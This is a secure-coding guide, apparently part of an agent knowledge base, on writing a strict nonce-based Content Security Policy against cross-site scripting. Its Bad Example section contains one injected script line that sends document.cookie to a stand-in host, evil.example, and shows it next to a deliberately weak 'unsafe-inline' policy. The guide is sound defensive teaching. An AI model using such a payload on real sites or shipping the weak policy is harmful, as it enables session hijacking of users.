---
id: security/20-csp
topic: security
slug: csp
title: "CSP"
type: doc
order: 20
status: ready
tags: [security, csp]
related: [security/11-xss, security/22-security-headers, security/10-output-encoding, security/19-cors]
when_to_use: "Read before adding or tightening a Content-Security-Policy header, or when hardening against XSS."
---
# CSP

## Purpose

This document defines how to write a Content Security Policy (CSP) that meaningfully
reduces the impact of cross-site scripting: what sources of script, style, and content the
browser is allowed to load and execute. It is written so an agent can ship a policy that
actually blocks injected script rather than a decorative header that blocks nothing.

CSP is defense-in-depth, not a primary control. It is the last line if
[output encoding](10-output-encoding.md) and [XSS](11-xss.md) defenses fail. A strong CSP
turns an injected `<script>` from account takeover into a blocked, reported no-op.

## Why It Matters

XSS remains one of the most common and damaging web vulnerabilities: one unescaped value
lets an attacker run arbitrary JavaScript in your users' sessions. You cannot guarantee
every template, every dependency, and every future edit is escape-perfect. CSP is the
safety net that assumes one of them will fail. But a weak policy — `unsafe-inline`,
wildcard hosts, or a missing `object-src` — provides the *appearance* of protection while
leaving the hole wide open. The difference between a real net and a fake one is a few
tokens in one header.

## Core Principles

- **Prefer nonces or hashes over host allowlists.** Allowlisting script hosts is routinely
  bypassable (open redirects, JSONP endpoints, hosted libraries). A per-response nonce or a
  content hash ties execution to script *you* emitted.
- **`unsafe-inline` defeats the point.** Allowing inline script means an injected inline
  `<script>` runs. If a nonce or hash is present, modern browsers ignore `unsafe-inline`
  for backward compatibility — rely on the nonce.
- **Deny by default, then allow narrowly.** Start from `default-src 'none'` (or `'self'`)
  and open only the specific directives and sources the page needs.
- **A policy you do not test is a policy you do not have.** Roll out in report-only mode,
  read the violation reports, then enforce. Shipping enforce-mode blind breaks the app or
  gets disabled in a panic.
- **CSP does not replace escaping.** It reduces XSS *impact*; it does not stop injection.
  Keep encoding and validation as the primary defense.

## Best Practices

- Use `default-src 'self'` as the baseline and set `object-src 'none'` and
  `base-uri 'none'` (or `'self'`) explicitly — these close plugin and base-tag injection
  that `default-src` does not cover.
- Adopt a **strict, nonce-based** policy:
  `script-src 'nonce-<random>' 'strict-dynamic'`. `strict-dynamic` lets a trusted script
  load its own dependencies without host allowlists.
- Generate a fresh, cryptographically random nonce **per response** and place it on every
  first-party `<script>` tag. Never reuse a nonce across requests.
- Add `frame-ancestors 'none'` (or specific origins) to stop clickjacking — it supersedes
  the legacy `X-Frame-Options` header.
- Send `Content-Security-Policy-Report-Only` with a `report-to` endpoint first; collect
  violations for a release cycle before switching to enforcing `Content-Security-Policy`.
- Avoid `unsafe-eval`; if a dependency needs it, isolate that dependency rather than
  weakening the whole page's policy.

## Examples

**Good Example** — strict nonce-based policy

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-r4nd0m2vB' 'strict-dynamic';
  object-src 'none';                # no Flash/plugin injection
  base-uri 'none';                  # attacker can't rewrite <base> to hijack relative URLs
  frame-ancestors 'none';           # clickjacking protection, replaces X-Frame-Options
  report-to csp-endpoint
```

```html
<!-- Only scripts carrying the matching per-response nonce execute. An injected
     <script> without the nonce is blocked, even if it lands inline in the page. -->
<script nonce="r4nd0m2vB" src="/app.js"></script>
```

**Bad Example** — allowlist plus `unsafe-inline`

```http
Content-Security-Policy:
  default-src *;                    # any host may supply content
  script-src 'self' 'unsafe-inline' https:;  # 'unsafe-inline' lets injected <script> run
  # no object-src, no base-uri, no frame-ancestors → plugin, base-tag, clickjacking holes
```

```html
<!-- With 'unsafe-inline', this attacker-injected tag executes: CSP provides no protection. -->
<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
```

## Common Mistakes

- Keeping `unsafe-inline` in `script-src`, which nullifies the policy against XSS.
- Building a host allowlist (`https:` or many CDNs) that includes a bypass (JSONP, open
  redirect) — attackers use it to load their script from an "allowed" host.
- Reusing a static nonce, or hard-coding one, so an attacker can copy it.
- Omitting `object-src 'none'` and `base-uri`, leaving plugin and base-tag vectors open.
- Deploying enforce-mode with no report-only trial, breaking the app on release.
- Treating CSP as a reason to skip output encoding.

## Production Tips

- Wire `report-to`/`report-uri` to a collector and alert on new violation patterns — they
  reveal both misconfigurations and real injection attempts.
- Generate the nonce in one middleware and expose it to the template layer; a nonce that is
  not on the tags is the same as no policy.
- Keep the policy in one place (a header middleware), not scattered across routes, so it can
  be reviewed and tightened as a unit.

## AI Review Checklist

- Is `script-src` nonce- or hash-based rather than relying on `unsafe-inline`?
- Is the nonce cryptographically random and regenerated per response?
- Are `object-src 'none'` and `base-uri` set explicitly?
- Is `frame-ancestors` set to stop framing/clickjacking?
- Was the policy trialed in report-only mode with a reporting endpoint before enforcing?
- Is `unsafe-eval` absent, or isolated to a justified dependency?
- Does the app still rely on [output encoding](10-output-encoding.md) as the primary
  [XSS](11-xss.md) defense, with CSP as backup?

## Related

- `knowledge/security/11-xss.md`
- `knowledge/security/22-security-headers.md`
- `knowledge/security/10-output-encoding.md`
- `knowledge/security/19-cors.md`
